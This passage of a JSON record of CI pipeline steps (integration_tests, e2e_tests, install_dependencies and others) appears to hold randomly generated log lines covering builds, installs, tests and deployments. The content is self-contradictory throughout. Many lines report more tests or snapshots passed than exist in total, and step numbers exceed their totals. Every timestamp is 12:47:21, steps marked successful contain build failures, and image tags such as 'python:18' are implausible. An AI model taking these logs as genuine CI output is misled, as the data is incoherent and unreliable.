          "[12:47:21] INFO: Processing request",
          "  PASS: test_db_connect (394ms)",
          "Processing...",
          "WARNING: react has known vulnerabilities",
          "Step 6/24: Testing",
          "Minifying vendor.js",
          "[12:47:21] DEBUG: Loading configuration",
          "WARNING: express has known vulnerabilities",
          "npm notice: created a lockfile",
          "Uploading artifact 'coverage' (20 files)",
          "Image pulled successfully",
          "Step 4/25: Linting",
          "Step 19/21: Deploying",
          "Cache saved successfully",
          "Finished.",
          "[12:47:21] INFO: Connecting to database",
          "Layer 2/15: RUN command",
          "Optimizing 13 modules...",
          "Fetching from https://docker.io/package.json",
          "[12:47:21] DEBUG: Memory usage: 980MB",
          "npm notice: created a lockfile",
          "pip: Collecting jest",
          "Finished.",
          "Platform: linux-x64",
          "Artifact downloaded: 38MB",
          "POST /data - 202 (196ms)",
          "Compiling components/app.ts...",
          "[12:47:21] DEBUG: Connection pool: 3 active",
          "[12:47:21] DEBUG: Initializing service",
          "Platform: darwin-arm64",
          "Optimizing 97 modules...",
          "Layer 4/11: ENV command",
          "Artifact downloaded: 32MB",
          "[12:47:21] DEBUG: Memory usage: 1007MB",
          "\u2713 deploy completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 lint completed",
          "Step 2/20: Running migrations",
          "Step 8/21: Linting",
          "[12:47:21] DEBUG: Memory usage: 620MB",
          "Waiting...",
          "[12:47:21] DEBUG: Initializing service",
          "Done.",
          "Step 3/15: Deploying",
          "Loading...",
          "GET /api - 204 (62ms)",
          "  PASS: test_auth_login (353ms)",
          "yarn add: Done in 20.53s",
          "Fetching submodules...",
          "Fetching from https://pypi.org/package.json",
          "Compiling lib/service.java...",
          "WARNING: axios has known vulnerabilities",
          "pip install: Successfully installed express-4.12",
          "Pushing to registry...",
          "[12:47:21] ERROR: Connection failed",
          "Building Docker image...",
          "Connection established",
          "Test Suites: 39 passed, 49 total",
          "  PASS: test_api_health (133ms)",
          "Optimizing 45 modules...",
          "Finished.",
          "Checking out main branch",
          "Time: 46.972s",
          "Time: 108.580s",
          "Using Python 3.11",
          "[12:47:21] INFO: Cache refreshed",
          "Completed.",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] INFO: Processing request",
          "Using Python 3.11",
          "  PASS: test_api_health (474ms)",
          "  PASS: integration/test_api_health.spec.js",
          "[12:47:21] INFO: Request completed",
          "[12:47:21] DEBUG: Memory usage: 1084MB",
          "  PASS: test_db_connect (178ms)",
          "[12:47:21] INFO: Connecting to database",
          "Completed.",
          "Snapshots: 25 passed, 6 total",
          "Platform: win32-x64",
          "Creating production build...",
          "\u2713 Task completed in 3849ms",
          "WARNING: lodash has known vulnerabilities",
          "Creating production build...",
          "Processing...",
          "pip install: Successfully installed prettier-3.3",
          "Environment: staging",
          "Step 10/15: Linting",
          "Test Suites: 25 passed, 35 total",
          "[12:47:21] INFO: Request completed",
          "pip: Downloading eslint-4.6.tar.gz",
          "Tests: 394 passed, 68 total",
          "Step 4/25: Building",
          "  PASS: integration/test_api_health.spec.js",
          "Uploading artifact 'dist' (36 files)",
          "[12:47:21] DEBUG: Loading configuration",
          "[12:47:21] DEBUG: Initializing service",
          "[12:47:21] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Checking out develop branch",
          "yarn add: Done in 16.99s",
          "Step 11/17: Building",
          "\u2713 Step 'setup' succeeded",
          "FAILED: test_db_connect",
          "yarn add: Done in 14.74s",
          "pip: Downloading express-2.14.tar.gz",
          "Cache hit for key-3114",
          "\u2717 build failed with exit code 127",
          "[12:47:21] DEBUG: Memory usage: 1027MB",
          "[12:47:21] INFO: Starting build process",
          "WARNING: express has known vulnerabilities",
          "Step 15/25: Building",
          "Tests: 179 passed, 468 total",
          "[12:47:21] ERROR: Connection failed",
          "Compiling lib/handler.rs...",
          "Compiling lib/handler.rs...",
          "[12:47:21] WARN: Deprecated API usage",
          "Step 12/19: Building",
          "Waiting...",
          "\u2713 Task completed in 3762ms",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 lint completed",
          "WARNING: eslint has known vulnerabilities",
          "OK",
          "NODE_ENV=test",
          "Snapshots: 21 passed, 20 total",
          "POST /data - 202 (239ms)",
          "OK",
          "Cache restored successfully (151MB)",
          "Success!",
          "[12:47:21] INFO: Processing request",
          "Pulling image: alpine:3.11",
          "Snapshots: 42 passed, 47 total",
          "Ran 74 tests in 52s",
          "Processing...",
          "Minifying vendor.js",
          "Transforming 416 files...",
          "[12:47:21] INFO: Processing request",
          "Uploading artifact 'build' (50 files)",
          "Pulling image: alpine:latest",
          "pip: Downloading express-1.19.tar.gz",
          "Cache hit for key-8526",
          "yarn add: Done in 30.21s",
          "[12:47:21] WARN: Deprecated API usage",
          "Ran 82 tests in 52s",
          "NODE_ENV=test",
          "Step 20/24: Building",
          "WARNING: webpack has known vulnerabilities",
          "npm install: added 403 packages",
          "OK",
          "Step 8/25: Installing dependencies",
          "Pushing to registry...",
          "Cache invalidated: dependencies",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-14T12:48:14.594652",
        "finished_at": "2025-12-14T12:48:29.717080",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Connection established",
          "pip: Downloading express-1.12.tar.gz",
          "Cache hit for key-5730",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] INFO: Cache refreshed",
          "WARNING: express has known vulnerabilities",
          "Finished.",
          "Pulling image: node:18",
          "[12:47:21] DEBUG: Connection pool: 11 active",
          "Pulling image: alpine:3.11",
          "Layer 9/13: COPY command",
          "Step 7/21: Installing dependencies",
          "OK",
          "Using Node.js 14.18.1",
          "npm install: added 199 packages",
          "\u2713 build completed",
          "[12:47:21] INFO: Connecting to database",
          "Fetching submodules...",
          "Verifying...",
          "Step 6/20: Linting",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] WARN: Deprecated API usage",
          "Platform: win32-x64",
          "\u2713 Step 'checkout' succeeded",
          "Image pulled successfully",
          "Snapshots: 8 passed, 44 total",
          "[12:47:21] DEBUG: Memory usage: 1884MB",
          "Finished.",
          "[12:47:21] INFO: Connecting to database",
          "OK",
          "GET /status - 204 (64ms)",
          "Step 8/25: Running migrations",
          "\u2713 All checks passed",
          "  PASS: test_db_connect (263ms)",
          "  PASS: test_api_health (461ms)",
          "  PASS: test_auth_login (122ms)",
          "Cache hit for key-4883",
          "[12:47:21] DEBUG: Loading configuration",
          "NODE_ENV=test",
          "Success!",
          "Verifying...",
          "Cache saved successfully",
          "Completed.",
          "Time: 57.333s",
          "[12:47:21] INFO: Processing request",
          "[12:47:21] WARN: Deprecated API usage",
          "Pushing to registry...",
          "yarn add: Done in 24.24s",
          "Environment: development",
          "\u2713 Step 'test' succeeded",
          "[12:47:21] DEBUG: Connection pool: 10 active",
          "Done.",
          "pip: Installing build dependencies...",
          "Pulling image: node:3.11",
          "Cache invalidated: node_modules",
          "Switched to branch 'bugfix/task-557'",
          "[12:47:21] INFO: Request completed",
          "Processing...",
          "Environment: development",
          "FAILED: test_auth_login",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:21] DEBUG: Loading configuration",
          "Layer 7/13: RUN command",
          "Coverage: 95% statements, 68% branches",
          "Tests: 265 passed, 71 total",
          "Compiling utils/main.py...",
          "Environment: development",
          "Image pulled successfully",
          "Fetching submodules...",
          "Test Suites: 25 passed, 38 total",
          "Test Suites: 12 passed, 27 total",
          "\u2717 build failed with exit code 44",
          "Waiting...",
          "Uploading artifact 'dist' (26 files)",
          "WARNING: express has known vulnerabilities",
          "Step 6/17: Deploying",
          "Compiling lib/handler.rs...",
          "[12:47:21] ERROR: Connection failed",
          "Transforming 929 files...",
          "WARNING: jest has known vulnerabilities",
          "Bundling vendor.css",
          "Using Python 3.9",
          "\u2713 Task completed in 3724ms",
          "Already up to date.",
          "Fetching from https://docker.io/package.json",
          "[12:47:21] INFO: Connecting to database",
          "Ready.",
          "\u2713 Step 'install' succeeded",
          "npm notice: created a lockfile",
          "Time: 64.622s",
          "Artifact downloaded: 3MB",
          "Cache restored successfully (495MB)",
          "\u2713 Step 'checkout' succeeded",
          "Creating production build...",
          "Compiling src/utils.go...",
          "Step 17/17: Deploying",
          "Connection established",
          "Generating source maps...",
          "Transforming 160 files...",
          "Coverage: 81% statements, 80% branches",
          "OK",
          "npm notice: created a lockfile",
          "Step 17/19: Installing dependencies",
          "\u2713 deploy completed",
          "Snapshots: 46 passed, 5 total",
          "[12:47:21] DEBUG: Loading configuration",
          "HEAD is now at 3567262",
          "Layer 9/10: ENV command",
          "yarn add: Done in 30.91s",
          "[12:47:21] DEBUG: Memory usage: 959MB",
          "Compiling src/handler.rs...",
          "Using Python 3.10",
          "Compiling utils/main.py...",
          "Pulling image: alpine:latest",
          "Step 20/19: Deploying",
          "Switched to branch 'feature/task-827'",
          "Step 17/20: Testing",
          "Step 6/16: Building",
          "[12:47:21] DEBUG: Loading configuration",
          "[12:47:21] WARN: Deprecated API usage",
          "Step 11/22: Building",
          "Compiling lib/app.ts...",
          "Cache invalidated: dependencies",
          "Switched to branch 'hotfix/task-443'",
          "Fetching submodules...",
          "WARNING: jest has known vulnerabilities",
          "Environment: development",
          "Cache invalidated: build",
          "Step 13/18: Testing",
          "Already up to date.",
          "[12:47:21] DEBUG: Query executed in 91ms",
          "Connection established",
          "Generating source maps...",
          "HEAD is now at a3bb691",
          "Step 11/19: Deploying",
          "Snapshots: 41 passed, 11 total",
          "[12:47:21] WARN: Deprecated API usage",
          "Step 12/15: Deploying",
          "Switched to branch 'bugfix/task-217'",
          "Completed.",
          "Cache restored successfully (431MB)",
          "NODE_ENV=production",
          "Connection established",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:21] INFO: Starting build process",
          "[12:47:21] INFO: Request completed",
          "npm install: resolved 1330 packages",
          "Compiling src/app.ts...",
          "Waiting...",
          "Tests: 216 passed, 62 total",
          "Step 10/19: Testing",
          "Switched to branch 'feature/task-769'",
          "pip: Downloading jest-5.18.tar.gz",
          "Step 17/16: Testing",
          "Ready.",
          "Exception: TypeError",
          "Step 7/18: Testing",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Already up to date.",
          "Optimizing 41 modules...",
          "Using Node.js 17.16.8",
          "Time: 110.116s",
          "\u2713 Step 'checkout' succeeded",
          "[12:47:21] DEBUG: Memory usage: 574MB",
          "[12:47:21] DEBUG: Loading configuration",
          "\u2713 Step 'test' succeeded",
          "Pulling image: python:latest",
          "Success!",
          "[12:47:21] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (29ms)",
          "Environment: production",
          "[12:47:21] INFO: Starting build process",
          "Platform: linux-x64",
          "Cache hit for key-6408",
          "Using Python 3.10",
          "[12:47:21] INFO: Request completed",
          "[12:47:21] DEBUG: Memory usage: 535MB",
          "[12:47:21] DEBUG: Loading configuration",
          "Waiting...",
          "yarn add: Done in 1.99s",
          "Compiling utils/main.py...",
          "Checking out main branch",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "Bundling main.js",
          "Ready.",
          "Fetching submodules...",
          "Building Docker image...",
          "Waiting...",
          "WARNING: express has known vulnerabilities",
          "TLS handshake completed",
          "Fetching submodules...",
          "Cache hit for key-3723",
          "Compiling lib/index.js...",
          "Fetching from https://docker.io/package.json",
          "npm install: added 497 packages",
          "Pushing to registry...",
          "npm install: resolved 885 packages",
          "Bundling vendor.css",
          "Building Docker image...",
          "pip: Collecting lodash",
          "Connection established",
          "Pulling image: node:latest",
          "[12:47:21] INFO: Request completed",
          "Generating source maps...",
          "Step 10/23: Testing",
          "pip: Collecting prettier",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Using Node.js 14.1.0",
          "Fetching from https://docker.io/package.json",
          "[12:47:21] DEBUG: Loading configuration",
          "Generating source maps...",
          "Bundling main.css",
          "Minifying main.js",
          "Step 4/25: Linting",
          "npm install: resolved 1956 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'build' succeeded",
          "[12:47:21] DEBUG: Query executed in 13ms",
          "  PASS: unit/test_db_connect.spec.js",
          "Uploading artifact 'coverage' (30 files)",
          "Verifying...",
          "TLS handshake completed",
          "[12:47:21] INFO: Processing request",
          "Step 13/24: Installing dependencies",
          "Ready.",
          "\u2713 package completed",
          "Waiting...",
          "[12:47:21] DEBUG: Loading configuration",
          "Layer 9/11: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:47:21] ERROR: Connection failed",
          "Compiling utils/index.js...",
          "Optimizing 76 modules...",
          "HEAD is now at 0f092e8",
          "Already up to date.",
          "OK",
          "Step 18/18: Running migrations",
          "[12:47:21] INFO: Starting build process",
          "Step 4/16: Installing dependencies",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-14T12:48:29.717080",
        "finished_at": "2025-12-14T12:48:37.278294",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Layer 5/11: RUN command",
          "[12:47:21] INFO: Request completed",
          "OK",
          "NODE_ENV=test",
          "Time: 11.311s",
          "Already up to date.",
          "npm notice: package.json updated",
          "Step 1/18: Testing",
          "Compiling src/app.ts...",
          "Ready.",
          "Done.",
          "HEAD is now at 0bb01ee",
          "[12:47:21] INFO: Processing request",
          "Artifact downloaded: 36MB",
          "Ready.",
          "Already up to date.",
          "[12:47:21] WARN: Deprecated API usage",
          "Tests: 52 passed, 397 total",
          "Time: 114.266s",
          "OK",
          "Snapshots: 39 passed, 24 total",
          "FAILED: test_auth_login",
          "Cache saved successfully",
          "Done.",
          "Environment: production",
          "Bundling main.css",
          "Compiling utils/app.ts...",
          "pip install: Successfully installed webpack-3.19",
          "WARNING: lodash has known vulnerabilities",
          "[12:47:21] DEBUG: Query executed in 44ms",
          "pip install: Successfully installed eslint-1.0",
          "Time: 40.25s",
          "HEAD is now at 5014da2",
          "Tests: 114 passed, 304 total",
          "Environment: production",
          "\u2713 Task completed in 4204ms",
          "Step 19/18: Testing",
          "Already up to date.",
          "Test Suites: 40 passed, 43 total",
          "Tests: 184 passed, 215 total",
          "[12:47:21] INFO: Connecting to database",
          "WARNING: lodash has known vulnerabilities",
          "Connection established",
          "Already up to date.",
          "Using Python 3.12",
          "OK",
          "\u2713 build completed",
          "[12:47:21] DEBUG: Query executed in 40ms",
          "NODE_ENV=development",
          "Time: 104.284s",
          "Artifact uploaded: dist.zip (67MB)",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Ready.",
          "GET /status - 201 (22ms)",
          "[12:47:21] DEBUG: Query executed in 55ms",
          "Test Suites: 30 passed, 7 total",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Optimizing 60 modules...",
          "Done.",
          "Uploading artifact 'dist' (4 files)",
          "Test Suites: 44 passed, 17 total",
          "Ready.",
          "Loading...",
          "npm notice: created a lockfile",
          "[12:47:21] INFO: Request completed",
          "Step 20/19: Linting",
          "Connection established",
          "npm notice: package.json updated",
          "Step 17/16: Linting",
          "Step 3/25: Running migrations",
          "Completed.",
          "[12:47:21] INFO: Starting build process",
          "Artifact downloaded: 48MB",
          "npm notice: created a lockfile",
          "Pulling image: python:3.11",
          "Installing webpack@2.7.1",
          "Minifying vendor.js",
          "Generating source maps...",
          "Time: 110.318s",
          "Time: 114.398s",
          "GET /status - 200 (95ms)",
          "Fetching from https://registry.npmjs.org/package.json",
          "[12:47:21] INFO: Processing request",
          "[12:47:21] WARN: Deprecated API usage",
          "Cache miss for key-9929",
          "Artifact uploaded: dist.zip (57MB)",
          "Building Docker image...",
          "Compiling src/utils.go...",
          "Verifying...",
          "Loading...",
          "Step 3/16: Linting",
          "Time: 112.685s",
          "npm notice: package.json updated",
          "Bundling styles.js",
          "Switched to branch 'feature/task-145'",
          "\u2713 All checks passed",
          "Checking out master branch",
          "HEAD is now at 75f235e",
          "\u2713 Task completed in 3357ms",
          "[12:47:21] DEBUG: Connection pool: 14 active",
          "  PASS: test_db_connect (125ms)",
          "Waiting...",
          "Fetching submodules...",
          "WARNING: webpack has known vulnerabilities",
          "pip: Downloading react-5.7.tar.gz",
          "[12:47:21] DEBUG: Memory usage: 1990MB",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 8/19: Linting",
          "Artifact uploaded: build.tar.gz (10MB)",
          "npm install: resolved 1199 packages",
          "[12:47:21] INFO: Request completed",
          "OK",
          "Success!",
          "Step 9/16: Testing",
          "Finished.",
          "Success!",
          "Bundling runtime.js",
          "[12:47:21] DEBUG: Initializing service",
          "[12:47:21] DEBUG: Initializing service",
          "[12:47:21] DEBUG: Initializing service",
          "Cache miss for key-4739",
          "TLS handshake completed",
          "Done.",
          "TLS handshake completed",
          "Time: 7.28s",
          "\u2713 Step 'install' succeeded",
          "Using Python 3.10",
          "Success!",
          "[12:47:21] DEBUG: Connection pool: 15 active",
          "[12:47:21] INFO: Cache refreshed",
          "[12:47:21] INFO: Starting build process",
          "\u2717 build failed with exit code 31",
          "Time: 71.390s",
          "npm install: resolved 998 packages",
          "Optimizing 49 modules...",
          "POST /api - 201 (148ms)",
          "Already up to date.",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/utils.go...",
          "npm install: added 123 packages",
          "[12:47:21] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 3",
          "Layer 5/8: COPY command",
          "[12:47:21] WARN: Deprecated API usage",
          "Step 12/16: Building",
          "OK",
          "Finished.",
          "Transforming 845 files...",
          "POST /data - 201 (417ms)",
          "Step 6/17: Building",
          "Compiling lib/utils.go...",
          "[12:47:21] DEBUG: Loading configuration",
          "Verifying...",
          "Generating source maps...",
          "Cache restored successfully (362MB)",
          "pip: Installing build dependencies...",
          "Exception: RuntimeError",
          "WARNING: webpack has known vulnerabilities",
          "Compiling components/app.ts...",
          "pip: Collecting lodash",
          "Creating production build...",
          "\u2713 Task completed in 4338ms",
          "[12:47:21] INFO: Request completed",
          "Cache miss for key-1197",
          "Ready.",
          "Creating production build...",
          "Environment: test",
          "WARNING: lodash has known vulnerabilities",
          "pip: Downloading axios-2.9.tar.gz",
          "npm install: added 330 packages",
          "Installing webpack@5.0.0",
          "Already up to date.",
          "Step 2/24: Deploying",
          "WARNING: jest has known vulnerabilities",
          "Step 8/24: Running migrations",
          "Artifact downloaded: 35MB",
          "[12:47:21] INFO: Request completed",
          "\u2713 test completed",
          "pip: Installing build dependencies...",
          "Step 16/22: Building",
          "GET /health - 201 (85ms)",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-9064",
          "Platform: darwin-arm64",
          "Fetching from https://gcr.io/package.json",
          "Compiling utils/utils.go...",
          "Creating production build...",
          "Ready.",
          "Optimizing 36 modules...",
          "Step 13/18: Running migrations",
          "[12:47:21] WARN: Deprecated API usage",
          "  PASS: test_db_connect (120ms)",
          "[12:47:21] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (37MB)",
          "npm install: resolved 1129 packages",
          "\u2713 All checks passed",
          "[12:47:21] WARN: Deprecated API usage",
          "OK",
          "Compiling components/utils.go...",
          "Verifying...",
          "WARNING: jest has known vulnerabilities",
          "Artifact downloaded: 16MB",
          "npm notice: package.json updated",
          "Generating source maps...",
          "[12:47:21] INFO: Processing request",
          "Pulling image: node:18",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pulling image: alpine:3.11",
          "Pulling image: python:3.11",
          "Building Docker image...",
          "[12:47:21] DEBUG: Initializing service",
          "[12:47:21] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "Compiling utils/service.java...",
          "pip: Installing build dependencies...",
          "[12:47:21] WARN: Deprecated API usage",
          "Compiling lib/index.js...",
          "Waiting...",
          "Step 1/20: Running migrations",
          "Cache miss for key-7458",
          "Time: 100.332s",
          "[12:47:21] ERROR: Connection failed",
          "Waiting...",
          "Cache saved successfully",
          "Waiting...",
          "FAILED: test_auth_login",
          "Coverage: 82% statements, 82% branches",
          "Snapshots: 49 passed, 41 total",
          "FAILED: test_db_connect",
          "Step 17/20: Building",
          "Step 4/17: Deploying",
          "npm notice: package.json updated",
          "Layer 6/8: COPY command",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing eslint@1.17.1",
          "Tests: 178 passed, 254 total",
          "[12:47:21] INFO: Processing request",
          "Loading...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-14T12:48:37.278294",
        "finished_at": "2025-12-14T12:48:59.961936",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "pip: Downloading eslint-5.7.tar.gz",
          "Waiting...",
          "Compiling utils/app.ts...",
          "Step 1/19: Building",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:21] WARN: Deprecated API usage",
          "Ready.",
          "Uploading artifact 'build' (16 files)",
          "Completed.",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "Step 6/25: Building",
          "[12:47:21] DEBUG: Loading configuration",
          "Step 1/20: Deploying",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 17/24: Deploying",
          "Already up to date.",
          "[12:47:21] INFO: Connecting to database",
          "POST /data - 201 (205ms)",
          "Using Python 3.12",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache miss for key-3507",
          "[12:47:21] INFO: Starting build process",
          "Creating production build...",
          "Step 2/20: Linting",
          "Time: 28.745s",
          "Compiling utils/utils.go...",
          "Artifact downloaded: 36MB",
          "Artifact uploaded: dist.zip (91MB)",
          "Success!",
          "[12:47:21] DEBUG: Memory usage: 1189MB",
          "Snapshots: 10 passed, 16 total",
          "Loading...",
          "npm install: resolved 1744 packages",
          "Transforming 768 files...",
          "[12:47:21] INFO: Request completed",
          "Compiling src/app.ts...",
          "Image pulled successfully",
          "Test Suites: 48 passed, 27 total",
          "Generating source maps...",
          "pip install: Successfully installed express-3.5",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: dist.zip (24MB)",
          "Creating production build...",
          "Cache saved successfully",
          "Cache invalidated: build",
          "Image pulled successfully",
          "Artifact downloaded: 48MB",
          "Minifying vendor.js",
          "\u2713 All checks passed",
          "Minifying app.js",
          "Step 12/15: Deploying",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Checking out main branch",
          "TLS handshake completed",
          "[12:47:21] DEBUG: Loading configuration",
          "Building Docker image...",
          "Done.",
          "Fetching from https://github.com/package.json",
          "[12:47:21] WARN: Deprecated API usage",
          "Pulling image: python:18",
          "npm notice: created a lockfile",
          "Snapshots: 8 passed, 7 total",
          "Step 7/21: Installing dependencies",
          "Step 10/16: Installing dependencies",
          "Step 9/18: Running migrations",
          "Cache invalidated: node_modules",
          "pip: Collecting eslint",
          "Switched to branch 'bugfix/task-560'",
          "pip: Downloading express-2.11.tar.gz",
          "Layer 2/15: COPY command",
          "yarn add: Done in 25.72s",
          "Step 13/18: Installing dependencies",
          "Installing express@1.20.1",
          "Step 2/23: Running migrations",
          "GET /health - 204 (39ms)",
          "Layer 4/12: ENV command",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Cache restored successfully (449MB)",
          "Platform: win32-x64",
          "pip: Downloading eslint-4.15.tar.gz",
          "Pushing to registry...",
          "[12:47:21] DEBUG: Loading configuration",
          "Compiling src/index.js...",
          "Platform: win32-x64",
          "Cache saved successfully",
          "yarn add: Done in 14.86s",
          "[12:47:21] DEBUG: Loading configuration",
          "Step 7/19: Building",
          "Tests: 281 passed, 140 total",
          "Artifact uploaded: dist.zip (46MB)",
          "Loading...",
          "Completed.",
          "Success!",
          "Already up to date.",
          "Already up to date.",
          "Completed.",
          "Building Docker image...",
          "HEAD is now at 2960c41",
          "Layer 4/11: RUN command",
          "[12:47:21] DEBUG: Initializing service",
          "Creating production build...",
          "[12:47:21] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_db_connect (484ms)",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Snapshots: 32 passed, 39 total",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2717 build failed with exit code 75",
          "Environment: development",
          "Processing...",
          "npm install: added 201 packages",
          "Transforming 309 files...",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Already up to date.",
          "npm install: resolved 1712 packages",
          "Exception: RuntimeError",
          "[12:47:21] DEBUG: Query executed in 41ms",
          "POST /data - 201 (404ms)",
          "Coverage: 89% statements, 71% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: dist.zip (42MB)",
          "Already up to date.",
          "Checking out master branch",
          "yarn add: Done in 17.30s",
          "Step 4/22: Deploying",
          "WARNING: prettier has known vulnerabilities",
          "Tests: 298 passed, 121 total",
          "OK",
          "\u2713 Task completed in 219ms",
          "Checking out main branch",
          "Switched to branch 'feature/task-374'",
          "Installing react@4.1.9",
          "Installing express@4.20.8",
          "Compiling utils/handler.rs...",
          "HEAD is now at 703ef9d",
          "Loading...",
          "[12:47:21] INFO: Processing request",
          "Platform: linux-x64",
          "Ready.",
          "pip install: Successfully installed axios-5.6",
          "Exception: NullPointerException",
          "Cache saved successfully",
          "Ran 171 tests in 13s",
          "npm install: resolved 1188 packages",
          "Step 11/15: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "Tests: 215 passed, 70 total",
          "Creating production build...",
          "yarn add: Done in 18.88s",
          "\u2713 Task completed in 773ms",
          "\u2713 Task completed in 3085ms",
          "Compiling src/handler.rs...",
          "Environment: production",
          "  PASS: test_user_create (239ms)",
          "NODE_ENV=production",
          "Image pulled successfully",
          "\u2713 Step 'install' succeeded",
          "Fetching from https://github.com/package.json",
          "pip install: Successfully installed lodash-5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] DEBUG: Initializing service",
          "Step 18/15: Testing",
          "\u2717 build failed with exit code 61",
          "HEAD is now at 8d2bb85",
          "npm notice: package.json updated",
          "FAILED: test_auth_login",
          "Minifying main.js",
          "pip: Installing build dependencies...",
          "Time: 75.251s",
          "\u2713 Task completed in 4399ms",
          "Step 14/20: Deploying",
          "Finished.",
          "pip: Downloading eslint-2.2.tar.gz",
          "\u2717 build failed with exit code 103",
          "TLS handshake completed",
          "Cache saved successfully",
          "WARNING: axios has known vulnerabilities",
          "[12:47:21] INFO: Processing request",
          "Bundling main.js",
          "OK",
          "[12:47:21] INFO: Processing request",
          "POST /api - 200 (40ms)",
          "[12:47:21] WARN: Deprecated API usage",
          "Success!",
          "[12:47:21] INFO: Connecting to database",
          "Layer 10/10: ENV command",
          "[12:47:21] DEBUG: Initializing service",
          "Loading...",
          "Completed.",
          "npm notice: package.json updated",
          "OK",
          "[12:47:21] INFO: Starting build process",
          "[12:47:21] INFO: Starting build process",
          "npm notice: package.json updated",
          "Artifact downloaded: 25MB",
          "Layer 3/8: ENV command",
          "Waiting...",
          "[12:47:21] DEBUG: Loading configuration",
          "GET /api - 200 (49ms)",
          "Cache restored successfully (164MB)",
          "Transforming 344 files...",
          "Using Python 3.9",
          "Fetching from https://docker.io/package.json",
          "Waiting...",
          "POST /upload - 200 (57ms)",
          "[12:47:21] WARN: Deprecated API usage",
          "Transforming 526 files...",
          "[12:47:21] INFO: Processing request",
          "Step 14/17: Linting",
          "Using Node.js 14.10.10",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:21] WARN: Deprecated API usage",
          "Environment: production",
          "Cache miss for key-8116",
          "Artifact uploaded: dist.zip (76MB)",
          "Cache invalidated: dependencies",
          "Waiting...",
          "Cache hit for key-2796",
          "Installing lodash@4.15.3",
          "GET /health - 204 (87ms)",
          "Loading...",
          "[12:47:21] DEBUG: Loading configuration",
          "Building Docker image...",
          "[12:47:21] DEBUG: Memory usage: 385MB",
          "Tests: 193 passed, 210 total",
          "  PASS: test_cache_hit (248ms)",
          "Compiling src/service.java...",
          "Environment: development",
          "Uploading artifact 'build' (17 files)",
          "Already up to date.",
          "Ran 53 tests in 2s",
          "[12:47:21] INFO: Request completed",
          "  PASS: unit/test_api_health.spec.js",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-14T12:48:59.961936",
        "finished_at": "2025-12-14T12:49:07.523150",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:47:21] INFO: Connecting to database",
          "Step 20/23: Building",
          "Cache invalidated: dependencies",
          "Transforming 475 files...",
          "Layer 8/10: COPY command",
          "[12:47:21] INFO: Request completed",
          "\u2713 Task completed in 3929ms",
          "Environment: test",
          "Time: 45.439s",
          "[12:47:21] DEBUG: Loading configuration",
          "Step 5/16: Running migrations",
          "[12:47:21] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-651'",
          "Fetching submodules...",
          "Pushing to registry...",
          "Cache miss for key-7492",
          "pip install: Successfully installed jest-4.16",
          "Success!",
          "  PASS: unit/test_auth_login.spec.js",
          "Snapshots: 3 passed, 9 total",
          "pip: Collecting express",
          "npm notice: package.json updated",
          "Snapshots: 1 passed, 29 total",
          "Optimizing 19 modules...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 12/21: Building",
          "Environment: production",
          "\u2713 Task completed in 4897ms",
          "Bundling runtime.css",
          "Artifact downloaded: 21MB",
          "Step 4/19: Installing dependencies",
          "Snapshots: 19 passed, 6 total",
